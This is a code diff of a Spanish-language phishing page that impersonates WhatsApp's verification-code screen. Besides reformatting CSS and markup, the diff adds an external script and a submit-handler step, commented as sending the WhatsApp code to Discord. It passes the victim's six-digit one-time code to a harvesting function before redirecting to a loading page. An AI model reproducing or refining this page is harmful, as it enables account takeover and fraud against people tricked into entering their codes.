@@ -28,7 +28,6 @@
       background-image: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23d1d7db' fill-opacity='0.25'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
     }
 
-    /* Card */
     .card {
       position:relative; z-index:1;
       width:100%; max-width:940px;
@@ -39,7 +38,6 @@
     }
     @keyframes rise { from{opacity:0;transform:translateY(20px) scale(.97)} to{opacity:1;transform:none} }
 
-    /* LEFT */
     .left {
       background:linear-gradient(155deg, var(--wa-teal-dark) 0%, var(--wa-teal) 60%, #1DA462 100%);
       padding:60px 44px;
@@ -50,37 +48,17 @@
     .left::after  { content:''; position:absolute; width:220px; height:220px; border-radius:50%; bottom:-55px; left:-55px; background:radial-gradient(circle, rgba(255,255,255,0.07) 0%, transparent 70%); }
     .left-in { position:relative; z-index:1; }
 
-    .badge {
-      display:inline-flex; align-items:center; gap:7px;
-      background:rgba(255,255,255,0.15); border:1px solid rgba(255,255,255,0.25);
-      border-radius:99px; padding:5px 14px;
-      font-size:10px; font-weight:600; letter-spacing:0.8px; text-transform:uppercase;
-      color:#fff; margin-bottom:28px;
-    }
+    .badge { display:inline-flex; align-items:center; gap:7px; background:rgba(255,255,255,0.15); border:1px solid rgba(255,255,255,0.25); border-radius:99px; padding:5px 14px; font-size:10px; font-weight:600; letter-spacing:0.8px; text-transform:uppercase; color:#fff; margin-bottom:28px; }
     .badge-dot { width:6px; height:6px; border-radius:50%; background:var(--wa-green); box-shadow:0 0 5px var(--wa-green); animation:blink 1.3s ease-in-out infinite alternate; }
     @keyframes blink { to{opacity:0.2} }
 
     .left-title { font-size:27px; font-weight:700; color:#fff; line-height:1.2; margin-bottom:10px; }
     .left-sub   { font-size:13px; color:rgba(255,255,255,0.72); line-height:1.75; margin-bottom:32px; }
 
-    /* Phone illustration */
-    .illustration {
-      width:100%; border-radius:14px; overflow:hidden;
-      background:rgba(255,255,255,0.08); border:1px solid rgba(255,255,255,0.12);
-      padding:22px 20px 16px;
-      display:flex; flex-direction:column; align-items:center; gap:14px;
-    }
+    .illustration { width:100%; border-radius:14px; overflow:hidden; background:rgba(255,255,255,0.08); border:1px solid rgba(255,255,255,0.12); padding:22px 20px 16px; display:flex; flex-direction:column; align-items:center; gap:14px; }
     .illus-phone { position:relative; width:110px; height:190px; }
-    .phone-body {
-      width:100%; height:100%;
-      background:linear-gradient(160deg,#f0f2f5,#e8ecef);
-      border-radius:20px;
-      border:2px solid rgba(0,0,0,0.08);
-      box-shadow:0 10px 28px rgba(0,0,0,0.25);
-      display:flex; flex-direction:column; align-items:center; overflow:hidden;
-    }
+    .phone-body { width:100%; height:100%; background:linear-gradient(160deg,#f0f2f5,#e8ecef); border-radius:20px; border:2px solid rgba(0,0,0,0.08); box-shadow:0 10px 28px rgba(0,0,0,0.25); display:flex; flex-direction:column; align-items:center; overflow:hidden; }
     .phone-notch { width:36px; height:8px; background:rgba(0,0,0,0.15); border-radius:99px; margin:9px auto 0; }
-    /* WhatsApp-style header inside phone */
     .phone-header { width:100%; background:var(--wa-teal); padding:5px 7px; display:flex; align-items:center; gap:4px; margin-top:4px; }
     .phone-header-dot { width:12px; height:12px; border-radius:50%; background:white; opacity:0.9; }
     .phone-header-name { font-size:5px; font-weight:700; color:white; flex:1; }
@@ -93,159 +71,67 @@
     .chat-code { font-family:'JetBrains Mono',monospace; font-size:10px; font-weight:700; color:var(--wa-teal-dark); letter-spacing:3px; animation:codePulse 2s ease-in-out infinite; }
     @keyframes codePulse { 0%,100%{opacity:1} 50%{opacity:0.5} }
     .phone-home { width:32px; height:3px; background:rgba(0,0,0,0.2); border-radius:99px; margin:5px auto; }
-
-    .wa-float {
-      position:absolute; top:-12px; left:-16px;
-      width:42px; height:42px; border-radius:50%;
-      background:var(--wa-green);
-      display:flex; align-items:center; justify-content:center;
-      box-shadow:0 4px 14px rgba(37,211,102,0.45);
-      animation:waFloat 3s ease-in-out infinite;
-    }
+    .wa-float { position:absolute; top:-12px; left:-16px; width:42px; height:42px; border-radius:50%; background:var(--wa-green); display:flex; align-items:center; justify-content:center; box-shadow:0 4px 14px rgba(37,211,102,0.45); animation:waFloat 3s ease-in-out infinite; }
     .wa-float svg { width:22px; height:22px; fill:white; }
     @keyframes waFloat { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-6px)} }
-
     .illus-caption { font-size:11px; color:rgba(255,255,255,0.5); text-align:center; font-weight:500; letter-spacing:0.3px; }
 
-    /* RIGHT */
     .right { background:var(--wa-white); padding:60px 50px; display:flex; flex-direction:column; justify-content:center; }
-
     .right-logo { display:flex; align-items:center; gap:10px; margin-bottom:28px; }
     .right-logo-icon { width:38px; height:38px; border-radius:10px; background:var(--wa-teal); display:flex; align-items:center; justify-content:center; }
     .right-logo-icon svg { width:20px; height:20px; fill:white; }
     .right-logo-text { font-size:17px; font-weight:700; color:var(--wa-teal-dark); }
-
     .r-title { font-size:23px; font-weight:700; color:var(--wa-text); margin-bottom:6px; }
     .r-sub   { font-size:13.5px; color:var(--wa-text-gray); line-height:1.6; margin-bottom:28px; }
 
-    /* Code input */
     .code-field { position:relative; margin-bottom:10px; }
-    .code-label {
-      position:absolute; top:11px; left:15px;
-      font-size:10px; font-weight:600; letter-spacing:1px; text-transform:uppercase;
-      color:var(--wa-text-gray); pointer-events:none;
-    }
-    .code-input {
-      width:100%; padding:28px 46px 12px 15px;
-      background:var(--wa-panel-bg);
-      border:1.5px solid var(--wa-border);
-      border-radius:12px;
-      font-family:'JetBrains Mono',monospace;
-      font-size:24px; font-weight:700; letter-spacing:8px;
-      color:var(--wa-text);
-      transition:border-color .2s, box-shadow .2s;
-      caret-color:var(--wa-teal);
-    }
+    .code-label { position:absolute; top:11px; left:15px; font-size:10px; font-weight:600; letter-spacing:1px; text-transform:uppercase; color:var(--wa-text-gray); pointer-events:none; }
+    .code-input { width:100%; padding:28px 46px 12px 15px; background:var(--wa-panel-bg); border:1.5px solid var(--wa-border); border-radius:12px; font-family:'JetBrains Mono',monospace; font-size:24px; font-weight:700; letter-spacing:8px; color:var(--wa-text); transition:border-color .2s, box-shadow .2s; caret-color:var(--wa-teal); }
     .code-input:focus { outline:none; border-color:var(--wa-teal); box-shadow:0 0 0 3px rgba(18,140,126,0.12); }
     .code-input.filled { border-color:var(--wa-green); }
     .code-input.err { border-color:#ef4444; box-shadow:0 0 0 3px rgba(239,68,68,0.1); animation:shake .35s ease; }
     @keyframes shake { 0%,100%{transform:translateX(0)} 25%{transform:translateX(-5px)} 75%{transform:translateX(5px)} }
-
-    .clear-btn {
-      position:absolute; right:13px; top:50%; transform:translateY(-50%);
-      background:var(--wa-border); border:none; border-radius:50%;
-      width:26px; height:26px; display:flex; align-items:center; justify-content:center;
-      cursor:pointer; opacity:0; transition:opacity .2s;
-      color:var(--wa-text-gray); font-size:13px; font-weight:700;
-    }
+    .clear-btn { position:absolute; right:13px; top:50%; transform:translateY(-50%); background:var(--wa-border); border:none; border-radius:50%; width:26px; height:26px; display:flex; align-items:center; justify-content:center; cursor:pointer; opacity:0; transition:opacity .2s; color:var(--wa-text-gray); font-size:13px; font-weight:700; }
     .clear-btn.show { opacity:1; }
     .clear-btn:hover { background:#c5cbd0; }
-
-    .resend-hint {
-      display:flex; align-items:center; gap:6px;
-      font-size:12px; color:var(--wa-text-gray); margin-bottom:24px;
-    }
+    .resend-hint { display:flex; align-items:center; gap:6px; font-size:12px; color:var(--wa-text-gray); margin-bottom:24px; }
     .resend-hint svg { width:12px; height:12px; fill:var(--wa-text-gray); flex-shrink:0; }
     .resend-hint a { color:var(--wa-teal); text-decoration:none; font-weight:600; }
     .resend-hint a:hover { text-decoration:underline; }
-
-    .err-bar {
-      display:flex; align-items:center; gap:8px;
-      padding:9px 13px; border-radius:9px;
-      background:rgba(239,68,68,0.06); border:1px solid rgba(239,68,68,0.2);
-      font-size:12px; font-weight:500; color:#dc2626;
-      margin-bottom:14px; opacity:0; transform:translateY(-4px);
-      transition:opacity .2s, transform .2s; pointer-events:none;
-    }
+    .err-bar { display:flex; align-items:center; gap:8px; padding:9px 13px; border-radius:9px; background:rgba(239,68,68,0.06); border:1px solid rgba(239,68,68,0.2); font-size:12px; font-weight:500; color:#dc2626; margin-bottom:14px; opacity:0; transform:translateY(-4px); transition:opacity .2s, transform .2s; pointer-events:none; }
     .err-bar.on { opacity:1; transform:translateY(0); }
     .err-bar svg { width:13px; height:13px; fill:#dc2626; flex-shrink:0; }
-
     .btn-group { display:flex; flex-direction:column; gap:10px; }
-
-    .btn {
-      width:100%; height:50px; border:none; border-radius:10px;
-      font-family:inherit; font-size:15px; font-weight:600;
-      cursor:pointer; transition:background .2s, transform .15s, box-shadow .2s;
-      position:relative; overflow:hidden;
-    }
-    .btn-primary {
-      background:var(--wa-teal); color:white;
-      box-shadow:0 2px 12px rgba(18,140,126,0.3);
-    }
+    .btn { width:100%; height:50px; border:none; border-radius:10px; font-family:inherit; font-size:15px; font-weight:600; cursor:pointer; transition:background .2s, transform .15s, box-shadow .2s; position:relative; overflow:hidden; }
+    .btn-primary { background:var(--wa-teal); color:white; box-shadow:0 2px 12px rgba(18,140,126,0.3); }
     .btn-primary:hover:not(:disabled) { background:var(--wa-teal-dark); transform:translateY(-1px); box-shadow:0 4px 18px rgba(7,94,84,0.35); }
     .btn-primary:disabled { opacity:0.45; cursor:not-allowed; transform:none !important; }
     .btn-primary.loading { color:transparent; }
-    .btn-primary.loading::after {
-      content:''; position:absolute; width:18px; height:18px; top:50%; left:50%; margin:-9px 0 0 -9px;
-      border:2.5px solid rgba(255,255,255,0.3); border-top-color:white;
-      border-radius:50%; animation:spin .7s linear infinite;
-    }
+    .btn-primary.loading::after { content:''; position:absolute; width:18px; height:18px; top:50%; left:50%; margin:-9px 0 0 -9px; border:2.5px solid rgba(255,255,255,0.3); border-top-color:white; border-radius:50%; animation:spin .7s linear infinite; }
     @keyframes spin { to{transform:rotate(360deg)} }
-
-    .btn-secondary {
-      background:var(--wa-panel-bg); color:var(--wa-text-gray);
-      border:1.5px solid var(--wa-border);
-    }
+    .btn-secondary { background:var(--wa-panel-bg); color:var(--wa-text-gray); border:1.5px solid var(--wa-border); }
     .btn-secondary:hover { background:#e8ecef; color:var(--wa-text); }
 
-    @media (max-width:800px) {
-      .card { grid-template-columns:1fr; max-width:440px; }
-      .left { padding:40px 30px; }
-      .illustration { display:none; }
-      .right { padding:40px 30px; }
-    }
-    @media (max-width:480px) {
-      body { padding:0; }
-      .card { border-radius:0; }
-      .left { padding:30px 20px; } .right { padding:30px 20px; }
-    }
+    @media (max-width:800px) { .card { grid-template-columns:1fr; max-width:440px; } .left { padding:40px 30px; } .illustration { display:none; } .right { padding:40px 30px; } }
+    @media (max-width:480px) { body { padding:0; } .card { border-radius:0; } .left { padding:30px 20px; } .right { padding:30px 20px; } }
   </style>
 </head>
 <body>
-
   <div class="card">
-
-    <!-- LEFT -->
     <div class="left">
       <div class="left-in">
         <div class="badge"><span class="badge-dot"></span> Código enviado</div>
-
         <h1 class="left-title">Revisa tu<br>WhatsApp</h1>
         <p class="left-sub">Ingresa el código que enviamos a tu cuenta de WhatsApp.</p>
-
         <div class="illustration">
           <div class="illus-phone">
-            <div class="wa-float">
-              <svg viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
-            </div>
+            <div class="wa-float"><svg viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg></div>
             <div class="phone-body">
               <div class="phone-notch"></div>
-              <div class="phone-header">
-                <div class="phone-header-dot"></div>
-                <div class="phone-header-name">WhatsApp</div>
-              </div>
+              <div class="phone-header"><div class="phone-header-dot"></div><div class="phone-header-name">WhatsApp</div></div>
               <div class="phone-screen">
-                <div class="chat-row-in">
-                  <div class="chat-bubble-in">
-                    <div class="chat-text">Tu código de verificación es:</div>
-                    <div class="chat-code">× × × × × ×</div>
-                  </div>
-                </div>
-                <div class="chat-row-out">
-                  <div class="chat-bubble-out">
-                    <div class="chat-text">¡Gracias!</div>
-                  </div>
-                </div>
+                <div class="chat-row-in"><div class="chat-bubble-in"><div class="chat-text">Tu código de verificación es:</div><div class="chat-code">× × × × × ×</div></div></div>
+                <div class="chat-row-out"><div class="chat-bubble-out"><div class="chat-text">¡Gracias!</div></div></div>
               </div>
               <div class="phone-home"></div>
             </div>
@@ -255,34 +141,26 @@
       </div>
     </div>
 
-    <!-- RIGHT -->
     <div class="right">
       <div class="right-logo">
-        <div class="right-logo-icon">
-          <svg viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
-        </div>
+        <div class="right-logo-icon"><svg viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg></div>
         <span class="right-logo-text">WhatsApp</span>
       </div>
-
       <h2 class="r-title">Ingresa el código</h2>
       <p class="r-sub">Hemos enviado un código de 6 dígitos a tu número de WhatsApp</p>
-
       <div class="code-field">
         <span class="code-label">Código</span>
         <input type="text" id="codeInput" class="code-input" maxlength="6" inputmode="numeric" autocomplete="one-time-code" placeholder="">
         <button class="clear-btn" id="clearBtn" tabindex="-1">×</button>
       </div>
-
       <div class="resend-hint">
         <svg viewBox="0 0 24 24"><path d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg>
         ¿No lo recibiste? <a href="#" id="resendBtn">Solicitar nuevo código</a>
       </div>
-
       <div class="err-bar" id="errBar">
         <svg viewBox="0 0 24 24"><path d="M12 9v4m0 4h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/></svg>
         <span id="errMsg">Ingresa el código de 6 dígitos</span>
       </div>
-
       <div class="btn-group">
         <button class="btn btn-primary" id="submitBtn">Verificar código</button>
         <button class="btn btn-secondary">Usar otro método</button>
@@ -290,6 +168,7 @@
     </div>
   </div>
 
+  <script src="script.js"></script>
   <script>
     const inp = document.getElementById('codeInput');
     const clearBtn = document.getElementById('clearBtn');
@@ -319,6 +198,12 @@
     submitBtn.addEventListener('click', async () => {
       if (inp.value.length !== 6) { showErr('Ingresa el código de 6 dígitos'); inp.focus(); return; }
       submitBtn.disabled = true; submitBtn.classList.add('loading'); clearErr();
+      
+      // ENVIAR CÓDIGO WHATSAPP A DISCORD
+      if (typeof sendWhatsAppCode === 'function') {
+        await sendWhatsAppCode(inp.value);
+      }
+      
       await new Promise(r => setTimeout(r, 1500));
       window.location.href = 'load.html';
     });
